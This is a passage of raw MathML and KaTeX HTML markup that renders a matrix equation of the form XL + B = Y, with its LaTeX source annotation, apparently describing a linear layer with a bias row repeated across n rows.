height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mi>m</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mi>m</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mi>m</mi><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mi>m</mi><mo stretchy=\"false\">)</mo><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mi>m</mi><mo stretchy=\"false\">)</mo><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mi>m</mi><mo stretchy=\"false\">)</mo><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mi>n</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mi>n</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>x</mi><mrow><mi>n</mi><mi>m</mi></mrow></msub></mstyle></mtd></mtr></mtable><mo fence=\"true\">)</mo></mrow><mrow><mo fence=\"true\">(</mo><mtable rowspacing=\"0.15999999999999992em\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mrow><mn>1</mn><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mrow><mn>2</mn><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mrow><mi>m</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mrow><mi>m</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>l</mi><mrow><mi>m</mi><mi>m</mi></mrow></msub></mstyle></mtd></mtr></mtable><mo fence=\"true\">)</mo></mrow><mo>+</mo><mrow><mo fence=\"true\">(</mo><mtable rowspacing=\"0.15999999999999992em\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mi>m</mi></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mi>m</mi></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mn>1</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mn>2</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>b</mi><mi>m</mi></msub></mstyle></mtd></mtr></mtable><mo fence=\"true\">)</mo></mrow><mo>=</mo><mrow><mo fence=\"true\">(</mo><mtable rowspacing=\"0.15999999999999992em\" columnspacing=\"1em\"><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mn>11</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mn>12</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mn>1</mn><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mn>21</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mn>22</mn></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mn>2</mn><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mi>m</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mi>m</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mi>m</mi><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mi>m</mi><mo stretchy=\"false\">)</mo><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mi>m</mi><mo stretchy=\"false\">)</mo><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mi>m</mi><mo stretchy=\"false\">)</mo><mi>m</mi></mrow></msub></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mrow></mrow></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mi><mi mathvariant=\"normal\">⋮</mi><mpadded height=\"+0em\" voffset=\"0em\"><mspace mathbackground=\"black\" width=\"0em\" height=\"1.5em\"></mspace></mpadded></mi></mstyle></mtd></mtr><mtr><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mi>n</mi><mn>1</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mi>n</mi><mn>2</mn></mrow></msub></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><mo lspace=\"0em\" rspace=\"0em\">⋯</mo></mstyle></mtd><mtd><mstyle scriptlevel=\"0\" displaystyle=\"false\"><msub><mi>y</mi><mrow><mi>n</mi><mi>m</mi></mrow></msub></mstyle></mtd></mtr></mtable><mo fence=\"true\">)</mo></mrow></mrow><annotation encoding=\"application/x-tex\">\\begin{pmatrix}\nx_{11} &amp; x_{12} &amp; \\cdots &amp; x_{1m}\\\\\nx_{21} &amp; x_{22} &amp; \\cdots &amp; x_{2m}\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\nx_{m1} &amp; x_{m2} &amp; \\cdots &amp; x_{mm}\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\nx_{(2m)1} &amp; x_{(2m)2} &amp; \\cdots &amp; x_{(2m)m}\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\nx_{n1} &amp; x_{n2} &amp; \\cdots &amp; x_{nm}\n\\end{pmatrix}\n\\begin{pmatrix}\nl_{11} &amp; l_{12} &amp; \\cdots &amp; l_{1m}\\\\\nl_{21} &amp; l_{22} &amp; \\cdots &amp; l_{2m}\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\nl_{m1} &amp; l_{m2} &amp; \\cdots &amp; l_{mm}\n\\end{pmatrix}\n+\n\\begin{pmatrix}\nb_{1} &amp; b_{2} &amp; \\cdots &amp; b_{m}\\\\\nb_{1} &amp; b_{2} &amp; \\cdots &amp; b_{m}\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\nb_{1} &amp; b_{2} &amp; \\cdots &amp; b_{m}\n\\end{pmatrix}\n=\n\\begin{pmatrix}\ny_{11} &amp; y_{12} &amp; \\cdots &amp; y_{1m}\\\\\ny_{21} &amp; y_{22} &amp; \\cdots &amp; y_{2m}\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\ny_{m1} &amp; y_{m2} &amp; \\cdots &amp; y_{mm}\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\ny_{(2m)1} &amp; y_{(2m)2} &amp; \\cdots &amp; y_{(2m)m}\\\\\n\\vdots &amp; \\vdots &amp;        &amp; \\vdots\\\\\ny_{n1} &amp; y_{n2} &amp; \\cdots &amp; y_{nm}\n\\end{pmatrix}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:11.579999999999998em;vertical-align:-5.539999999999999em;\"></span><span class=\"minner\"><span class=\"mopen\"><span class=\"delimsizing mult\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.950085000000001em;\"><span style=\"top:1.6500649999999992em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎝</span></span></span><span style=\"top:0.5000549999999994em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-0.09495500000000094em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-0.6899650000000012em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-1.2849750000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-1.8799850000000013em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-2.474995000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.0700050000000014em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-3.6650150000000012em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-4.260025000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-4.855035000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-5.450045000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-6.0450550000000005em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-6.640065000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-6.710065000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎜</span></span></span><span style=\"top:-7.950085000000001em;\"><span class=\"pstrut\" style=\"height:3.1550000000000002em;\"></span><span class=\"delimsizinginner delim-size4\"><span>⎛</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.450085em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mtable\"><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.039999999999999em;\"><span style=\"top:-8.8875em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">1</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-7.687499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mtight\">2</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-5.8275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-4.6275em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">m</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:-2.7674999999999996em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:-1.5674999999999997em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.34480000000000005em;\"><span style=\"top:-2.5198em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mord mathnormal mtight\">m</span><span class=\"mclose mtight\">)</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.3551999999999999em;\"><span></span></span></span></span></span></span></span></span><span style=\"top:0.2924999999999998em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord\">⋮</span><span class=\"mord rule\" style=\"border-right-width:0em;border-top-width:1.5em;bottom:0em;\"></span></span></span></span><span style=\"top:1.492499999999999em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.30110799999999993em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">n</span><span class=\"mord mtight\">1</span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:5.539999999999999em;\"><span></span></span></span></span></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"arraycolsep\" style=\"width:0.5em;\"></span><span class=\"col-align-c\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:6.039999999999999em;\"><span style=\"top:-8.8875em;\"><span class=\"pstrut\" style=\"height:3.6875em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathnormal\">x</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" 